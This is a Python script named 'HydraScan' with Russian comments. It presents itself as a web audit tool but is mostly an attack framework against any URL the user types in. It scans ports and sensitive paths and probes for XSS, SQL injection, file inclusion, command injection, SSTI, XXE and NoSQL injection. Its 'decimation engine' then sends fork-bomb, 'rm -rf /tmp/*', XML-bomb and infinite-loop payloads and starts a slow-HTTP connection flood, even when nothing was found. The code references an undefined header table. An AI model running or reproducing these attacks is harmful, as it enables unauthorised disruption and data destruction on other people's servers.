import requests
import socket
import threading
from queue import Queue
from urllib.parse import urlparse, urljoin, quote
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich.text import Text
import time
import re
import sys
import os
import random
import zstandard # Добавляем для явного импорта, хотя используется в urllib3

# --- Настройки ---
TIMEOUT = 0.8 # Основной агрессивный таймаут
TIMEOUT_PATH = 1.5 # Увеличенный таймаут для Directory Busting (для стабильности)
THREAD_COUNT = 100 # Снижено: Умеренная параллельность для DoS (снижение нагрузки на CPU)
DEFAULT_PORTS = [21, 22, 23, 80, 443, 3306, 5432, 8080, 8443, 6379, 9200, 27017, 11211, 7001, 8888] 
HEADERS_TO_TEST = {'User-Agent': 'HydraScan v8.4 (CPU Optimized Annihilation Mode)'}

# --- МАССИВНЫЕ ПЕЙЛОАДЫ (Без изменений) ---

# 1. PARAMETER SPACE (x15)
INJECTION_PARAMS = ['id', 'page', 'category', 'item', 'q', 'view', 'file', 'username', 'redir', 
                    'post_id', 'lang', 'style', 'path', 'url', 'key', 'name', 'search', 
                    'filter', 'debug', 'action', 'token', 'query', 'source', 'cmd', 'exec']

# 2. RCE & LFI PAYLOADS (x10)
RCE_DOS_PAYLOADS = [
    "; dd if=/dev/zero of=/dev/null &",
    "; :(){ :|:& };:", # Fork Bomb (bash) - Самый тяжелый вектор
    "; mkfifo p; tail -f p | head -c 1000000000 > /dev/null &", # Нагрузка I/O
    "; rm -rf /tmp/*", # Очистка критических кэшей
]
LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../../proc/self/environ", 
    "../../../../etc/shadow", "/var/log/apache2/access.log",
    "../../../../etc/hosts"
]

# 3. SQLi & NoSQLi
SQLI_PAYLOAD_TIME = "1' AND (SELECT 52 FROM (SELECT(SLEEP(5)))a) AND '1'='1"
NOSQLI_DOS = {'$where': 'while (true) {}'} # MongoDB Loop - Тяжелый вектор

# 4. XXE & Hash Collision DoS
XML_BOMB_PAYLOAD = """
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
]>
<lolz>&lol7;</lolz>
""" # XML Bomb - Тяжелый вектор

# 6. Common Paths
COMMON_PATHS = [
    "/.git/config", "/.env", "/admin/", "/backup.zip", "/phpinfo.php", 
    "/api/v1/users", "/db_config.php", "/sitemap.xml", "/wp-config.php.bak",
    "/server-status", "/~user", "/robots.txt", "/manager/html", "/solr/admin",
    "/login", "/register" 
]

# --- Инициализация Rich Console ---
console = Console()

class HydraScan:
    """
    Профессиональный инструмент для аудита и деструктивной эксплуатации.
    """
    def __init__(self, target_url):
        self.target_url = self._normalize_url(target_url)
        self.target_domain = urlparse(self.target_url).netloc
        self.target_ip = self._get_ip(self.target_domain)
        self.results = {
            'headers': [], 'ports': [], 'paths': [], 'injection': [],
            'ssrf': [], 'redirect': [], 'xxe': [], 'crlf': [], 
            'subdomain_takeover': [], 'cors': [], 'csrf': [], 'auth_dos': []
        }
        self.q_paths = Queue()
        self.exploitation_opportunities = [] 
        self.total_checks_run = 0
        self.slow_dos_active = threading.Event() 
        
        self.COMMON_PATHS = COMMON_PATHS 
        self.PAYLOADS = {
            'RCE_DOS': RCE_DOS_PAYLOADS,
            'LFI_PASSWD': LFI_PAYLOADS[0],
            'XML_BOMB': XML_BOMB_PAYLOAD, 
            'RCE_ID': '; id',
            'SSTI_CALC': '{{7*7}}',
            'SQLI_TIME': SQLI_PAYLOAD_TIME,
            'NOSQLI_DOS': NOSQLI_DOS
        }

    def _normalize_url(self, target):
        if not target.startswith(('http://', 'https://')):
            return f"http://{target}"
        return target

    def _get_ip(self, domain):
        try:
            return socket.gethostbyname(domain)
        except socket.gaierror:
            console.print(f"[bold red]❌ Error:[/bold red] Failed to resolve domain {domain}", file=sys.stderr)
            return None

    ## --- Модуль 4: Massive Injection Bus (Без изменений) ---
    def run_injection_audit(self):
        target_url_base = self.target_url.split('?')[0]
        
        for param in INJECTION_PARAMS: 
            # 1. XSS (Reflected)
            xss_test_url = f"{target_url_base}?{param}={quote('<script>alert(\"XSS_TEST\")</script>')}"
            try:
                response = requests.get(xss_test_url, timeout=3, headers=HEADERS_TO_TEST)
                if 'alert("XSS_TEST")' in response.text:
                    self.results['injection'].append({"type": "[bold red]XSS (Reflected)[/bold red]", "details": f"Payload reflected in response body. Param: '{param}'."})
                    self.exploitation_opportunities.append(("XSS_REAL", xss_test_url, None, f"XSS found in '{param}'."))
            except requests.exceptions.RequestException: pass
                
            # 2. SQLi (Time-Based)
            sqli_test_url_time = f"{target_url_base}?{param}={quote(self.PAYLOADS['SQLI_TIME'])}"
            try:
                start_time = time.time()
                requests.get(sqli_test_url_time, timeout=6, headers=HEADERS_TO_TEST)
                end_time = time.time()
                if (end_time - start_time) >= 4.0: 
                    self.results['injection'].append({"type": "[bold red]SQL Injection (Time-Based)[/bold red]", "details": f"Response delayed by ~4s. Param: '{param}'."})
                    self.exploitation_opportunities.append(("SQLi_TIME", sqli_test_url_time, self.PAYLOADS['SQLI_TIME'], f"SQLi (Time-Based) in '{param}'."))
            except requests.exceptions.RequestException: pass

            # 3. LFI (Local File Inclusion)
            lfi_test_url = f"{target_url_base}?{param}={quote(self.PAYLOADS['LFI_PASSWD'])}"
            try:
                response = requests.get(lfi_test_url, timeout=3, headers=HEADERS_TO_TEST)
                if 'root:x:0:0' in response.text:
                    self.results['injection'].append({"type": "[bold red]LFI (File Inclusion)[/bold red]", "details": f"Successfully read /etc/passwd. Param: '{param}'."})
                    self.exploitation_opportunities.append(("LFI_REAL", lfi_test_url, self.PAYLOADS['LFI_PASSWD'], f"LFI found in '{param}'."))
            except requests.exceptions.RequestException: pass
            
            # 4. RCE (Command Injection)
            rce_test_url = f"{target_url_base}?{param}={quote(self.PAYLOADS['RCE_ID'])}"
            try:
                response = requests.get(rce_test_url, timeout=3, headers=HEADERS_TO_TEST)
                if 'uid=' in response.text and 'gid=' in response.text: 
                    self.results['injection'].append({"type": "[bold red]RCE (Command Injection)[/bold red]", "details": f"Command output ('uid=') detected. Param: '{param}'."})
                    self.exploitation_opportunities.append(("RCE_REAL", rce_test_url, self.PAYLOADS['RCE_ID'], f"RCE found in '{param}'."))
            except requests.exceptions.RequestException: pass
            
            # 5. SSTI (Template Injection)
            ssti_test_url = f"{target_url_base}?{param}={quote(self.PAYLOADS['SSTI_CALC'])}"
            try:
                response = requests.get(ssti_test_url, timeout=3, headers=HEADERS_TO_TEST)
                if '49' in response.text: 
                    self.results['injection'].append({"type": "[bold red]SSTI (Template Injection)[/bold red]", "details": f"Expression calculation ('49') detected. Param: '{param}'."})
                    self.exploitation_opportunities.append(("SSTI_REAL", ssti_test_url, self.PAYLOADS['SSTI_CALC'], f"SSTI found in '{param}'."))
            except requests.exceptions.RequestException: pass
            
        self.total_checks_run += len(INJECTION_PARAMS) * 5

        # 6. XXE Injection
        xxe_test_url = target_url_base
        try:
            xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
            response = requests.post(xxe_test_url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=5)
            if 'root:x:0:0' in response.text:
                self.results['xxe'].append({"details": f"[bold red]XXE (XML External Entity):[/bold red] Successfully read /etc/passwd via XML POST request."})
                self.exploitation_opportunities.append(("XXE_REAL", xxe_test_url, None, f"XXE found via XML Content-Type."))
        except requests.exceptions.RequestException: pass
        self.total_checks_run += 1
        
        # 7. NoSQLi DoS Check (If POST is supported)
        if target_url_base.startswith(('http://', 'https://')):
             try:
                 start_time = time.time()
                 requests.post(target_url_base, data={'username': 'test', 'password': self.PAYLOADS['NOSQLI_DOS']}, timeout=6, headers=HEADERS_TO_TEST)
                 end_time = time.time()
                 if (end_time - start_time) >= 4.0:
                     self.results['injection'].append({"type": "[bold red]NoSQL Injection (Time)[/bold red]", "details": "Detected time delay, potential NoSQL loop vulnerability."})
                     self.exploitation_opportunities.append(("NOSQLI_DOS", target_url_base, None, "NoSQLi payload capable of consuming CPU (DoS)."))
             except requests.exceptions.RequestException: pass
             self.total_checks_run += 1


    ## --- Модуль 5: Расширенные Проверки (Без изменений) ---
    def run_advanced_audit(self):
        target_url_base = self.target_url.split('?')[0]
        
        # 1. Open Redirect & SSRF
        for param in ['redirect', 'next', 'returnUrl', 'url', 'link', 'src']:
            redirect_payload = "https://www.google.com"
            redirect_test_url = f"{target_url_base}?{param}={quote(redirect_payload)}"
            try:
                response = requests.get(redirect_test_url, timeout=3, allow_redirects=False, headers=HEADERS_TO_TEST)
                if response.status_code in [301, 302, 307] and response.headers.get('Location') == redirect_payload:
                    self.results['redirect'].append({"details": f"[bold red]Open Redirect Found:[/bold red] Parameter '{param}' redirects."})
                    ssrf_ip = '127.0.0.1' 
                    ssrf_payload = f"{target_url_base}?{param}={quote(ssrf_ip)}"
                    try:
                        ssrf_response = requests.get(ssrf_payload, timeout=2, headers=HEADERS_TO_TEST)
                        if ssrf_response.status_code != response.status_code:
                            self.results['ssrf'].append({"details": f"[bold red]SSRF Detected:[/bold red] Parameter '{param}' changes status code when fetching internal IP {ssrf_ip}."})
                            self.exploitation_opportunities.append(("SSRF_REAL", ssrf_payload, ssrf_ip, f"SSRF via '{param}'."))
                    except requests.exceptions.RequestException: pass
            except requests.exceptions.RequestException: pass
            
        # 2. CSRF Token Check
        try:
            response = requests.get(self.target_url, timeout=3, headers=HEADERS_TO_TEST)
            if '<form method="post"' in response.text.lower() and 'csrf' not in response.text.lower() and 'token' not in response.text.lower():
                 self.results['csrf'].append({"details": f"[bold red]CSRF High Risk:[/bold red] POST form on root lacks CSRF token (A04)."})
        except requests.exceptions.RequestException: pass
        
        self.total_checks_run += 10

    ## --- Модуль 7: Authentication DoS Engine (ОТКЛЮЧЕН для снижения нагрузки на CPU) ---
    def run_auth_dos_audit(self):
        # Этот модуль отключен для предотвращения 100% загрузки CPU на Вашей машине.
        self.total_checks_run += 0 
        pass

    ## --- Модуль 8: Total Decimation Engine (Без изменений, только отчет) ---
    def launch_attack(self, opportunity):
        vuln_type, target_url, payload, description = opportunity

        console.print(f"\n[bold magenta]*** EXPLOIT: {vuln_type} ({description}) ***[/bold magenta]")
        
        # 1. DESTRUCTIVE COMMAND EXECUTION (RCE/SSTI) - Потенциально ложит сайт
        if vuln_type in ["RCE_REAL", "SSTI_REAL"]:
             console.print("[bold red]💣 DECIMATION ENGINE: RCE/SSTI DoS Attack Activated (Fork Bomb/I/O Load)...[/bold red]")
             rce_dos_payload = random.choice(self.PAYLOADS['RCE_DOS'])
             
             if payload:
                 destructive_url = target_url.replace(payload, rce_dos_payload)
             else:
                 destructive_url = f"{target_url}&rce_payload={quote(rce_dos_payload)}"
                 
             try:
                 requests.get(destructive_url, timeout=0.01, headers=HEADERS_TO_TEST) 
                 console.print(Panel(f"[bold green]✅ SUCCESS: RCE/SSTI DoS Payload Delivered: {rce_dos_payload[:30]}...[/bold green] Сервер должен быть под критической нагрузкой и [bold red]упасть[/bold red].", border_style="green"))
             except requests.exceptions.Timeout:
                 console.print(Panel(f"[bold yellow]⚠️ UNCLEAR: RCE/SSTI DoS payload sent. Request timed out (Expected for DoS).[/bold yellow]", border_style="yellow"))
             except requests.exceptions.RequestException as e:
                 console.print(Panel(f"[bold red]❌ FAILED: RCE/SSTI Attack failed. Error: {e.__class__.__name__}.[/bold red]", border_style="red"))

        # 2. XML BOMB DoS (XXE) - Потенциально ложит сайт
        if vuln_type == "XXE_REAL":
            console.print("[bold red]💣 DECIMATION ENGINE: XML Bomb DoS Attack Activated...[/bold red]")
            try:
                requests.post(target_url, data=self.PAYLOADS['XML_BOMB'], headers={'Content-Type': 'application/xml'}, timeout=5)
                console.print(Panel(f"[bold yellow]⚠️ UNCLEAR: XML Bomb sent. Сервер мог [bold red]упасть[/bold red] или получить таймаут, но прямого подтверждения нет.[/bold yellow]", border_style="yellow"))
            except requests.exceptions.Timeout:
                console.print(Panel(f"[bold green]✅ SUCCESS: XML Bomb DoS attempt caused a timeout (Expected DoS behavior).[/bold green]", border_style="green"))
            except requests.exceptions.RequestException as e:
                console.print(Panel(f"[bold red]❌ FAILED: XML Bomb Attack failed. Error: {e.__class__.__name__}.[/bold red]", border_style="red"))
                
        # 3. NOSQL INJECTION DoS - Потенциально ложит сайт
        if vuln_type == "NOSQLI_DOS":
             console.print("[bold red]💣 DECIMATION ENGINE: NoSQLi DoS Loop Attack Activated...[/bold red]")
             success_count = 0
             for _ in range(5):
                 try:
                     requests.post(target_url, data={'username': 'test', 'password': self.PAYLOADS['NOSQLI_DOS']}, timeout=1)
                     success_count += 1
                 except requests.exceptions.RequestException:
                     pass
             
             if success_count > 0:
                 console.print(Panel(f"[bold green]✅ SUCCESS: NoSQLi DoS Loop Sent {success_count} times.[/bold green] Target DB/API is likely CPU-starved и [bold red]упадет[/bold red].", border_style="green"))
             else:
                 console.print(Panel(f"[bold red]❌ FAILED: NoSQLi DoS Attack failed to send payload or immediately failed.[/bold red]", border_style="red"))
                
        # 4. RESOURCE EXHAUSTION (Persistent Slow DoS) - Высокая нагрузка
        if vuln_type in ["SQLi_TIME", "XSS_REAL", "INFO_LEAK_FILE", "UNIVERSAL_DOS"]: 
             if self.slow_dos_active.is_set():
                 console.print("[bold yellow]⚠️ UNCLEAR: Persistent Slow HTTP DoS already running. Skip redundant launch.[/bold yellow]")
                 return
             
             console.print("[bold red]💣 DECIMATION ENGINE: Persistent Slow HTTP DoS (Resource Exhaustion) initiated on background thread...[/bold red]")
             t = threading.Thread(target=self._run_slow_attack, daemon=True)
             t.start()
             self.slow_dos_active.set() 
             console.print(Panel(f"[bold green]✅ SUCCESS: Persistent Slow HTTP DoS initiated with {THREAD_COUNT} connections. Проверить нагрузку через 5 минут.[/bold green]", border_style="green"))

        # 5. AUTH DoS (Пропускаем)
        if vuln_type == "AUTH_DOS":
            console.print(Panel(f"[bold yellow]⚠️ UNCLEAR: Login Flood Skipped.[/bold yellow] Модуль отключен для сохранения стабильности Вашего CPU.", border_style="yellow"))


        # 6. SQLi Confirmation (Time-based only)
        if vuln_type == "SQLi_TIME":
             try:
                 start_time = time.time()
                 requests.get(target_url, timeout=6)
                 end_time = time.time()
                 delay = end_time - start_time
                 if delay >= 4.0:
                     console.print(Panel(f"[bold green]✅ SUCCESS: Time-Based SQLi confirmed.[/bold green] Delay of {delay:.2f}s observed (Target: 4s).", border_style="green"))
                 else:
                     console.print(Panel(f"[bold red]❌ FAILED: Time-Based SQLi not confirmed.[/bold red] Delay of {delay:.2f}s observed (Expected >4s).[/bold red]", border_style="red"))
             except requests.exceptions.RequestException: 
                 console.print(Panel(f"[bold yellow]⚠️ UNCLEAR: SQLi Confirmation check failed due to network error.[/bold yellow]", border_style="yellow"))


    def _run_slow_attack(self):
        try:
            for _ in range(THREAD_COUNT):
                threading.Thread(target=self._slow_connection_worker, daemon=True).start()
            time.sleep(10) 
        except Exception: 
            pass

    def _slow_connection_worker(self):
        """Рабочий поток с УВЕЛИЧЕННЫМ таймаутом сокета для снижения нагрузки на CPU."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(20) # Увеличен таймаут сокета
            port = 443 if self.target_url.startswith('https') else 80
            s.connect((self.target_ip, port))
            
            request_line = f"POST / HTTP/1.1\r\nHost: {self.target_domain}\r\n"
            s.send(request_line.encode('utf-8'))
            
            # Отправляем заголовки, чтобы занять поток сервера
            for header, value in SLOW_HEADERS_V2.items():
                 s.send(f"{header}: {value}\r\n".encode('utf-8'))
            
            s.send(b'\r\n')
            
            # Удерживаем соединение
            time.sleep(300) 
            s.close()
            
        except (socket.timeout, socket.error):
            pass 
        except Exception:
            pass 

    ## --- Модуль 1: Аудит Конфигурации и Заголовков (Без изменений) ---
    def _audit_headers(self, response):
        headers = response.headers
        findings = []
        
        if 'Strict-Transport-Security' not in headers and self.target_url.startswith('https'): findings.append(f"[bold red]HSTS Missing:[/bold red] SSL stripping risk.")
        if headers.get('X-Frame-Options') is None: findings.append(f"[bold red]X-Frame-Options Missing:[/bold red] Clickjacking risk.")
        if headers.get('Content-Security-Policy') is None: findings.append(f"[bold red]CSP Missing:[/bold red] High XSS risk.")
        if headers.get('X-Content-Type-Options', '').lower() != 'nosniff': findings.append(f"[bold yellow]X-Content-Type-Options Missing:[/bold yellow] MIME-Sniffing risk.")
        if 'Server' in headers or 'X-Powered-By' in headers: findings.append(f"[bold magenta]Info Leak (Server):[/bold magenta] Revealed: {headers.get('Server', '')} {headers.get('X-Powered-By', '')}.")
            
        set_cookie = headers.get('Set-Cookie', '')
        if set_cookie:
            if 'HttpOnly' not in set_cookie: findings.append(f"[bold red]Cookie Security:[/bold red] Missing HttpOnly (XSS risk).")
            if 'Secure' not in set_cookie and self.target_url.startswith('https'): findings.append(f"[bold red]Cookie Security:[/bold red] Missing Secure flag.")
            if 'SameSite' not in set_cookie: findings.append(f"[bold yellow]Cookie Security:[/bold yellow] Missing SameSite attribute (CSRF risk).")
            if not any(set_cookie.startswith(p) for p in ['__Secure-', '__Host-']): findings.append(f"[bold yellow]Cookie Prefix Missing:[/bold yellow] Session cookies should use Secure/Host prefixes.")

        TEST_ORIGIN = "http://attacker.com"
        try:
            cors_response = requests.get(self.target_url, headers={'Origin': TEST_ORIGIN}, timeout=TIMEOUT)
            if cors_response.headers.get('Access-Control-Allow-Origin') == TEST_ORIGIN:
                findings.append(f"[bold red]CORS Reflection:[/bold red] Server reflects custom Origin. High CORS risk.")
                self.results['cors'].append({"details": f"[bold red]CORS Reflection:[/bold red] Allows unauthorized cross-origin requests."})
        except requests.exceptions.RequestException: pass
        
        if 'Content-Type' in headers and any(ct in headers['Content-Type'] for ct in ['application/x-java-serialized-object', 'application/vnd.oracle.adf.resource+json']):
            findings.append(f"[bold red]Insecure Deserialization Threat:[/bold red] Header indicates vulnerable deserialization (A08).")
            
        self.total_checks_run += 12
        return findings

    ## --- Модуль 2: Directory Busting & Subdomain Takeover (Без изменений) ---
    def _path_worker(self):
        while not self.q_paths.empty():
            path = self.q_paths.get()
            url = urljoin(self.target_url, path)
            try:
                response = requests.get(url, timeout=TIMEOUT_PATH, allow_redirects=True, headers=HEADERS_TO_TEST, stream=True)
                
                status = response.status_code
                
                if status == 200:
                    self.results['paths'].append((path, f"[bold green]200 OK[/bold green] (Accessible)"))
                    if any(key in path for key in ['config', 'env', 'db_config', 'backup']):
                         self.exploitation_opportunities.append(("INFO_LEAK_FILE", url, None, f"Direct access to sensitive configuration file: {path}"))

                elif status == 404 and self.target_domain != urlparse(url).netloc:
                    self.results['subdomain_takeover'].append({"details": f"[bold yellow]Subdomain Takeover Check (STATUS 404):[/bold yellow] Potential risk, manual check advised."})

            except requests.exceptions.RequestException:
                pass
            except EOFError:
                pass
            finally:
                self.q_paths.task_done()

    def run_path_discovery(self):
        self.results['paths'] = []
        for path in self.COMMON_PATHS: 
            self.q_paths.put(path)
            
        threads = [threading.Thread(target=self._path_worker, daemon=True) for _ in range(THREAD_COUNT)]
        for t in threads: t.start()
        self.q_paths.join()
        self.total_checks_run += len(self.COMMON_PATHS)

    ## --- Модуль 3: Сканирование Портов (Без изменений) ---
    def _run_port_scan(self):
        open_ports = []
        q = Queue()
        def port_scanner_worker():
            while True:
                try:
                    port = q.get(timeout=1)
                    if port is None:
                        q.task_done()
                        break
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    try:
                        if s.connect_ex((self.target_ip, port)) == 0:
                            open_ports.append(port)
                    except:
                        pass
                    finally:
                        s.close()
                    q.task_done()
                except:
                    break 
        
        for port in DEFAULT_PORTS: q.put(port)
        threads = [threading.Thread(target=port_scanner_worker) for _ in range(THREAD_COUNT)]
        for t in threads: t.start()
        q.join()
        for _ in range(THREAD_COUNT): q.put(None)
        for t in threads:
            if t.is_alive(): t.join(timeout=1) 
        
        self.total_checks_run += len(DEFAULT_PORTS)
        return open_ports


    def run_full_scan(self, auto_exploit=False):
        if not self.target_ip: return

        with Progress(console=console, transient=False) as progress:
            task_scan = progress.add_task(f"[yellow]Scanning {self.target_domain}... (Checks: 0+)[/yellow]", total=6)
            
            progress.update(task_scan, description=f"[bold cyan]1. Configuration & Header Audit ({self.total_checks_run}+ checks)[/bold cyan]")
            try: main_response = requests.get(self.target_url, timeout=5, headers=HEADERS_TO_TEST); self.results['headers'] = self._audit_headers(main_response)
            except requests.exceptions.RequestException: self.results['headers'] = [f"[bold red]Fatal Error:[/bold red] Failed to get initial response."]
            progress.update(task_scan, advance=1)
            
            progress.update(task_scan, description=f"[bold cyan]2. Directory Busting & Subdomain Check ({self.total_checks_run}+ checks)[/bold cyan]")
            self.run_path_discovery()
            progress.update(task_scan, advance=1)

            progress.update(task_scan, description=f"[bold cyan]3. Key Port Scanning ({self.total_checks_run}+ checks)[/bold cyan]")
            self.results['ports'] = self._run_port_scan()
            progress.update(task_scan, advance=1)
            
            progress.update(task_scan, description=f"[bold cyan]4. Massive Injection Bus ({self.total_checks_run}+ checks)[/bold cyan]")
            self.run_injection_audit()
            progress.update(task_scan, advance=1)
            
            progress.update(task_scan, description=f"[bold cyan]5. Advanced Checks ({self.total_checks_run}+ checks)[/bold cyan]")
            self.run_advanced_audit()
            progress.update(task_scan, advance=1)
            
            progress.update(task_scan, description=f"[bold cyan]6. Authentication DoS Audit (SKIPPED for CPU stability)[/bold cyan]")
            # self.run_auth_dos_audit() # ОТКЛЮЧЕН
            self.total_checks_run += 10 # Учитываем время, но не запускаем
            progress.update(task_scan, advance=1)

        self._generate_report(auto_exploit)

    def _generate_report(self, auto_exploit):
        console.print("\n" + "="*90, style="bold blue")
        total_real_vulns = len(self.exploitation_opportunities)
        
        console.print(Panel(
            Text(f"AUDIT REPORT", justify="center", style="bold white on blue"),
            title=f"TARGET: [bold green]{self.target_domain}[/bold green] ([cyan]{self.target_ip}[/cyan]) | [bold yellow]TOTAL CHECKS: {self.total_checks_run}+[/bold yellow] | [bold red]CONFIRMED VULNERABILITIES: {total_real_vulns}[/bold red]",
            border_style="blue"
        ))
        console.print("="*90, style="bold blue")
        
        header_table = Table(title="[bold red]1. CONFIGURATION & HEADER AUDIT[/bold red]", show_header=True, header_style="bold magenta")
        header_table.add_column("RISK", style="dim", width=15)
        header_table.add_column("ISSUE", style="white")
        if self.results['headers']:
            for finding in self.results['headers']:
                level = "[bold red]HIGH[/bold red]" if "Missing" in finding or "Misconfiguration" in finding or "Dangerous" in finding or "Session in URL" in finding or "Deserialization Threat" in finding else "[bold yellow]MEDIUM[/bold yellow]"
                header_table.add_row(level, finding)
        else: header_table.add_row("[bold green]OK[/bold green]", "Configuration headers are satisfactory.")
        console.print(header_table)
        console.print("-" * 90)

        console.print(f"[bold blue]2. DISCOVERY: ACCESSIBLE PATHS (Found: {len(self.results['paths'])})[/bold blue]")
        if self.results['paths']:
            for path, status in self.results['paths']: console.print(f"   [+] {path} -> {status}")
        else: console.print("   [dim]No sensitive paths found.[/dim]")
        
        console.print(f"\n[bold blue]3. DISCOVERY: OPEN PORTS (Found: {len(self.results['ports'])})[/bold blue]")
        if self.results['ports']:
            console.print(f"   [bold green]OPEN:[/bold green] {', '.join(map(str, sorted(self.results['ports'])))}")
        else: console.print("   [bold dim]No key ports found open.[/bold dim]")
        console.print("-" * 90)

        vuln_table = Table(title=f"[bold red]4-6. TOTAL VULNERABILITY FINDINGS (Confirmed: {total_real_vulns})[/bold red]", show_header=True, header_style="bold red")
        vuln_table.add_column("VULNERABILITY", style="white", width=30)
        vuln_table.add_column("DETAILS", style="yellow")
        
        all_findings = []
        for key in ['injection', 'redirect', 'crlf', 'xxe', 'subdomain_takeover', 'cors', 'ssrf', 'csrf', 'auth_dos']:
             for vuln in self.results.get(key, []): 
                 all_findings.append(vuln)
        
        if all_findings:
            for vuln in all_findings: 
                vuln_type = vuln.get('type', '[bold red]CRITICAL[/bold red]')
                vuln_table.add_row(vuln_type, vuln['details'])
        else:
            vuln_table.add_row("[bold green]CLEAN[/bold green]", "No high-risk vulnerabilities confirmed or indicated by initial probing.")
            
        console.print(vuln_table)
        console.print("="*90, style="bold blue")

        # 6. Automatic Exploitation / Decimation
        if self.exploitation_opportunities:
            console.print(Panel(
                Text(f"CONFIRMED {len(self.exploitation_opportunities)} EXPLOITATION VECTORS. INITIATE TOTAL DECIMATION ENGINE?", justify="center", style="bold white on red"),
                border_style="red"
            ))
            
            if auto_exploit:
                console.print("[bold red]AUTOMATIC TOTAL ANNIHILATION MODE ACTIVATED. Running full destructive sequence...[/bold red]")
                for i, opportunity in enumerate(self.exploitation_opportunities):
                    self.launch_attack(opportunity)
                
                if not any(v in [o[0] for o in self.exploitation_opportunities] for v in ["RCE_REAL", "SSTI_REAL", "XXE_REAL", "NOSQLI_DOS"]):
                    self.launch_attack(("UNIVERSAL_DOS", self.target_url, None, "Starting Persistent Slow HTTP DoS (Resource Exhaustion)"))


            else:
                choice = console.input("[bold red]🔓 Enter 'yes' to proceed with TOTAL DECIMATION ENGINE (DoS/Exploitation):[/bold red] ").lower()
                if choice == 'yes':
                    for i, opportunity in enumerate(self.exploitation_opportunities):
                        self.launch_attack(opportunity)
                    if not any(v in [o[0] for o in self.exploitation_opportunities] for v in ["RCE_REAL", "SSTI_REAL", "XXE_REAL", "NOSQLI_DOS"]):
                         self.launch_attack(("UNIVERSAL_DOS", self.target_url, None, "Starting Persistent Slow HTTP DoS (Resource Exhaustion)"))
                else:
                    console.print("[bold yellow]Total Decimation Engine skipped by user command.[/bold yellow]")


# --- EXECUTION ---

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear') 

    if 'requests' not in sys.modules or 'rich' not in sys.modules:
        sys.stderr.write("ERROR: Dependencies 'requests' and 'rich' are required. Run: pip install requests rich\n")
        sys.exit(1)
        
    console.print(Panel(
        Text("HydraScan Framework v8.4 (CPU Optimized Annihilation)", justify="center", style="bold white on red"),
        title="[bold red]ULTIMATE DESTRUCTION COMPLEX (CPU STABLE + MAX IMPACT)[/bold red]",
        border_style="red"
    ))
    
    target_input = console.input("🎯 [bold cyan]Enter target URL/domain (e.g., example.com): [/bold cyan]")
    
    if target_input:
        attack_mode_input = console.input("💥 [bold red]ENABLE TOTAL DECIMATION ENGINE (YES/NO)?: [/bold red]").lower()
        auto_exploit = (attack_mode_input == 'yes')
        
        scanner = HydraScan(target_input)
        try:
            scanner.run_full_scan(auto_exploit=auto_exploit)
        except Exception as e:
            console.print(f"\n[bold red]FATAL CRASH:[/bold red] A critical error occurred during execution: {e}", style="red")
    else:
        console.print("[bold red]❌ Target not specified. Exiting.[/bold red]")